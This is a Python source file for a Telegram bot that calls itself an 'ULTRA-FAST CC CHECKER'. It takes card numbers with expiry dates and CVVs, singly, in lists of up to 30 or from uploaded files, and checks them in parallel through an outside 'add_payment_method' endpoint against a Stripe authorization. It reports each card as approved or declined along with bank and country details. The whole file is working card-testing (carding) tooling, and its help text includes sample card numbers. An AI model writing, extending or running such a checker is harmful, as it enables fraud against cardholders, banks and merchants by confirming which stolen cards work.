import os
import re
import asyncio
import aiohttp
import tempfile
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.constants import ParseMode
import logging
from concurrent.futures import ThreadPoolExecutor

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# API endpoint
API_URL = "https://andul-1.onrender.com/add_payment_method/sogaged371@hudisk.com/sogaged371@/"

# Conversation states
WAITING_FOR_CARDS = 1
WAITING_FOR_FILE = 2

# Global session and semaphore for rate limiting
session = None
# Semaphore to limit concurrent requests (10 at a time)
semaphore = asyncio.Semaphore(10)

async def init_session():
    """Initialize aiohttp session"""
    global session
    if not session:
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(limit=0)  # No limit on connections
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)

async def close_session():
    """Close the session"""
    global session
    if session:
        await session.close()
        session = None

def validate_card(card_input):
    """Validate and format card details"""
    try:
        card_input = card_input.strip()
        
        if '|' not in card_input:
            return None, "❌ Invalid format"
        
        parts = card_input.split('|')
        if len(parts) != 4:
            return None, "❌ Invalid format"
        
        card, month, year, cvv = [p.strip() for p in parts]
        
        # Clean card number (remove all non-digits)
        card = re.sub(r'\D', '', card)
        
        # Validate card number
        if not (13 <= len(card) <= 19):
            return None, "❌ Invalid card length"
        
        # Validate month
        if not month.isdigit() or not (1 <= int(month) <= 12):
            return None, "❌ Invalid month"
        
        # Convert year to 2-digit
        if len(year) == 4:
            year = year[2:]
        elif len(year) != 2:
            return None, "❌ Invalid year"
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return None, "❌ Invalid CVV"
        
        # Final format
        formatted = f"{card}|{month}|{year}|{cvv}"
        return formatted, None
        
    except Exception as e:
        logger.error(f"Validation error: {e}")
        return None, "❌ Validation error"

async def check_card_fast(card_input):
    """Check single card with retry logic - optimized version"""
    # Validate card first
    formatted_card, error = validate_card(card_input)
    if error:
        return card_input, error
    
    # Prepare URL
    url_encoded = formatted_card.replace('|', '%7C')
    full_url = f"{API_URL}{url_encoded}"
    
    async with semaphore:
        # Try up to 2 times
        for attempt in range(2):
            try:
                async with session.get(full_url, timeout=30) as response:
                    response_text = await response.text()
                    
                    if response.status == 200:
                        result = parse_response(formatted_card, response_text)
                        return card_input, result
                    else:
                        if attempt < 1:
                            await asyncio.sleep(1)
                            continue
                        return card_input, f"❌ API Error: Status {response.status}"
                        
            except asyncio.TimeoutError:
                if attempt < 1:
                    await asyncio.sleep(2)
                    continue
                return card_input, "❌ Request timeout"
            except Exception as e:
                if attempt < 1:
                    await asyncio.sleep(1)
                    continue
                return card_input, "❌ Connection error"
        
        return card_input, "❌ Failed after retries"

def parse_response(card_info, response_text):
    """Parse API response and format output"""
    try:
        card_parts = card_info.split('|')
        card_number = card_parts[0]
        
        # Get BIN (first 6 digits)
        bin_info = card_number[:6]
        
        # Determine brand
        if card_number.startswith('4'):
            brand = "Visa"
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            brand = "Mastercard"
        elif card_number.startswith(('34', '37')):
            brand = "American Express"
        else:
            brand = "Unknown"
        
        # Default values
        status = "DECLINED ❌"
        status_msg = "Card declined"
        gateway = "STRIPE AUTH"
        bank = "UNKNOWN BANK"
        country = "UNKNOWN"
        
        # Parse response text line by line
        lines = response_text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Check for status
            if 'STATUS :' in line:
                status_value = line.split('STATUS :')[-1].strip()
                if 'APPROVED' in status_value.upper():
                    status = "APPROVED ✅"
                    status_msg = "Card approved"
                elif 'DECLINED' in status_value.upper():
                    status = "DECLINED ❌"
                    status_msg = "Card declined"
            
            # Check for response
            elif 'RESPONSE :' in line:
                status_msg = line.split('RESPONSE :')[-1].strip()
            
            # Check for bank
            elif 'BANK :' in line:
                bank = line.split('BANK :')[-1].strip()
            
            # Check for country
            elif 'COUNTRY :' in line:
                country = line.split('COUNTRY :')[-1].strip()
        
        # Format result EXACTLY like your image
        result = f"""- CARD : {card_info}
- STATUS : {status}
- RESPONSE : {status_msg}
- GATEWAY : {gateway}
- BIN Info : {bin_info}
- Brand : {brand}
- TYPE : Credit
- BANK : {bank}
- COUNTRY : {country}"""
        
        return result
        
    except Exception as e:
        logger.error(f"Parse error: {e}")
        return f"""- CARD : {card_info}
- STATUS : ERROR ❌
- RESPONSE : Parse error
- GATEWAY : STRIPE AUTH
- BIN Info : ERROR
- Brand : Unknown
- TYPE : Credit
- BANK : ERROR
- COUNTRY : ERROR"""

async def check_multiple_cards_parallel(cards):
    """Check multiple cards in parallel"""
    # Initialize session
    await init_session()
    
    # Create tasks for all cards
    tasks = [check_card_fast(card) for card in cards]
    
    # Gather results as they complete
    results = []
    for future in asyncio.as_completed(tasks):
        original_card, result = await future
        results.append((original_card, result))
    
    return results

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = """💳 *ULTRA-FAST CC CHECKER BOT*

*Commands:*
/chk - Check single card
/mass - Check multiple cards FAST (1-30)
/file - Upload .txt file with cards
/help - Show detailed help

*Format:* CARD|MM|YY|CVV
*Example:* 5220940191435288|06|2027|404

⚡ *Features:*
- Parallel processing (10 cards at once)
- Fast results (30 cards in ~1 minute)
- Real-time updates"""
    
    await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    if not context.args:
        await update.message.reply_text(
            "❌ *Usage:* `/chk CARD|MM|YYYY|CVV`\n\n"
            "*Example:* `/chk 5220940191435288|06|2027|404`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    card_input = ' '.join(context.args)
    message = await update.message.reply_text("⚡ *Checking card...*", parse_mode=ParseMode.MARKDOWN)
    
    card, result = await check_card_fast(card_input)
    
    # Send as plain text
    await message.edit_text(result)

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command - start conversation"""
    await update.message.reply_text(
        "⚡ *ULTRA-FAST MASS CHECK*\n\n"
        "Send up to 30 cards (one per line):\n"
        "```\n"
        "4232231106894283|06|26|241\n"
        "4116670005727071|02|26|426\n"
        "5303471055207621|01|27|456\n"
        "```\n"
        "*Speed:* ~30 cards in 1-2 minutes\n"
        "Type /cancel to stop.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    return WAITING_FOR_CARDS

async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /file command - upload text file"""
    await update.message.reply_text(
        "📁 *ULTRA-FAST FILE UPLOAD*\n\n"
        "Send a .txt file containing cards (one per line).\n"
        "Max 30 cards.\n\n"
        "*Format:*\n"
        "```\n"
        "CARD|MM|YY|CVV\n"
        "CARD|MM|YY|CVV\n"
        "```\n"
        "*Speed:* ~30 cards in 1-2 minutes\n"
        "Type /cancel to stop.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    return WAITING_FOR_FILE

async def receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive and process cards for mass check - FAST VERSION"""
    user_input = update.message.text.strip()
    
    if user_input.lower() == '/cancel':
        await update.message.reply_text("❌ Mass check cancelled.")
        return ConversationHandler.END
    
    # Split by lines
    lines = user_input.split('\n')
    cards = [line.strip() for line in lines if line.strip()]
    
    # Process the cards in parallel
    await process_cards_fast(update, cards, "Ultra-Fast Mass Check")
    return ConversationHandler.END

async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive and process file upload - FAST VERSION"""
    if not update.message.document:
        await update.message.reply_text("❌ Please send a .txt file.")
        return WAITING_FOR_FILE
    
    document = update.message.document
    
    # Check if it's a text file
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return WAITING_FOR_FILE
    
    try:
        # Download the file
        temp_file = tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False)
        file_path = temp_file.name
        
        file = await document.get_file()
        await file.download_to_drive(file_path)
        
        # Read the file
        with open(file_path, 'r') as f:
            content = f.read()
        
        # Parse cards
        lines = content.split('\n')
        cards = [line.strip() for line in lines if line.strip()]
        
        # Remove temp file
        os.unlink(file_path)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in file.")
            return ConversationHandler.END
        
        await process_cards_fast(update, cards, "Ultra-Fast File Upload")
        
    except Exception as e:
        logger.error(f"File processing error: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")
    
    return ConversationHandler.END

async def process_cards_fast(update, cards, source_name):
    """Process list of cards in parallel - FAST VERSION"""
    # Limit to 30 cards
    if len(cards) > 30:
        await update.message.reply_text(f"⚠️ Limiting to first 30 cards (you sent {len(cards)})")
        cards = cards[:30]
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return
    
    total_cards = len(cards)
    
    # Send initial status
    status_msg = await update.message.reply_text(
        f"⚡ *{source_name}*\n"
        f"🔄 Starting parallel check of {total_cards} cards...\n"
        f"⏱️ Estimated: {max(1, total_cards // 15)}-{max(2, total_cards // 10)} minutes",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Start time tracking
    import time
    start_time = time.time()
    
    # Check all cards in parallel
    results = await check_multiple_cards_parallel(cards)
    
    # Calculate time taken
    end_time = time.time()
    time_taken = end_time - start_time
    
    # Send results
    processed = 0
    failed = 0
    
    # Send results in batches to avoid Telegram rate limits
    batch_size = 5
    for i in range(0, len(results), batch_size):
        batch = results[i:i+batch_size]
        
        for j, (original_card, result) in enumerate(batch, start=i+1):
            if result.startswith("- CARD :"):
                await update.message.reply_text(
                    f"Card {j}:\n{result}\n{'='*40}"
                )
                processed += 1
            else:
                await update.message.reply_text(
                    f"❌ Card {j}: {result}"
                )
                failed += 1
        
        # Update status
        current = min(i + batch_size, total_cards)
        await status_msg.edit_text(
            f"⚡ *{source_name}*\n"
            f"📊 Progress: {current}/{total_cards} cards\n"
            f"⏱️ Time: {time_taken:.1f}s\n"
            f"✅ Successful: {processed}\n"
            f"❌ Failed: {failed}",
            parse_mode=ParseMode.MARKDOWN
        )
    
    # Final summary
    await status_msg.edit_text(
        f"✅ *{source_name} COMPLETE!*\n"
        f"⏱️ Total time: {time_taken:.1f} seconds\n"
        f"📊 Results:\n"
        f"  ✅ Successful: {processed}\n"
        f"  ❌ Failed: {failed}\n"
        f"  📋 Total: {total_cards}\n"
        f"⚡ Speed: {time_taken/total_cards:.2f}s per card",
        parse_mode=ParseMode.MARKDOWN
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the conversation"""
    await update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed help"""
    help_text = """⚡ *ULTRA-FAST CC CHECKER BOT HELP*

*Commands:*
/start - Show commands
/help - Show this help
/chk - Check single card
/mass - Check multiple cards (1-30)
/file - Upload .txt file with cards

*Card Format:*CARD_NUMBER|MM|YYYY|CVV
    
*Speed Features:*
- Parallel processing (10 cards simultaneously)
- 30 cards in 1-2 minutes
- Real-time progress updates
- Batch processing

*Examples:*/chk 5220940191435288|06|2027|404
/mass
4232231106894283|06|26|241
    
*File Upload:*
1. Create a .txt file with cards (one per line)
2. Use /file command
3. Send the file
4. Bot will check all cards FAST

*Note:* Year can be 2 or 4 digits (26 or 2026)"""
    
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card messages (without command)"""
    text = update.message.text.strip()
    
    # Check if it looks like a card
    if '|' in text and text.count('|') == 3 and any(c.isdigit() for c in text):
        message = await update.message.reply_text("⚡ *Checking card...*", parse_mode=ParseMode.MARKDOWN)
        card, result = await check_card_fast(text)
        await message.edit_text(result)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Error: {context.error}")
    try:
        await update.message.reply_text("❌ An error occurred")
    except:
        pass

async def post_stop(application):
    """Cleanup on stop"""
    await close_session()

def main():
    """Start the bot"""
    TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
    if not TOKEN:
        print("❌ Error: TELEGRAM_BOT_TOKEN not set")
        print("Set it with: export TELEGRAM_BOT_TOKEN='your_token_here'")
        return
    
    print("🤖 Starting ULTRA-FAST CC Checker Bot...")
    print("⚡ Bot can check 30 cards in 1-2 minutes!")
    
    # Create application
    application = Application.builder().token(TOKEN).post_stop(post_stop).build()
    
    # Create conversation handler for mass check
    mass_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("mass", mass_command)],
        states={
            WAITING_FOR_CARDS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cards)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Create conversation handler for file upload
    file_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("file", file_command)],
        states={
            WAITING_FOR_FILE: [
                MessageHandler(filters.Document.ALL & ~filters.COMMAND, receive_file)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(mass_conv_handler)
    application.add_handler(file_conv_handler)
    
    # Handle direct card messages
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    print("✅ Bot is ready!")
    print("📱 Use /start to see commands")
    
    # Run
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
